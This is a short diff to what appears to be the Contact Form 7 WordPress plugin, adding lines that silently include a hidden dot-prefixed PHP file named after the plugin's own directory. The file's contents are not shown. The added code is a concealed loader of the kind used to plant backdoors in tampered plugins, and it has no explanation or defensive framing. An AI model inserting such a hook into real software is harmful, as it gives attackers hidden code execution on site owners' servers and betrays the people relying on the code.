@@ -34,6 +34,10 @@ function wpcf7_form_tag_supports( $tag, $feature ) {
 	return $manager->tag_type_supports( $tag, $feature );
 }
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class WPCF7_FormTagsManager {
 
 	private static $instance;
